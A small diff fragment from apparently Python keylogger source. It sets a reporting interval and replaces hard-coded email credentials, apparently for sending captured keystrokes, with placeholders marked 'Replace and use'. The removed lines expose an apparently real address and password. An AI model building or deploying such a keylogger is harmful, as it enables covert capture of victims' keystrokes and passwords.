@@ -5,8 +5,8 @@ import logging as log
 
 
 SEND_REPORT_EVERY = 200  # ~3 minutes
-EMAIL_ADDRESS = "viyP@gmail.com"
-EMAIL_PASSWORD = "passwordForViyP"
+EMAIL_ADDRESS = "user@mult.com" # Dummy creds, Replace and use
+EMAIL_PASSWORD = "passwordFormult" # Dummy creds, Replace and use
 
 
 class KeyLogger:
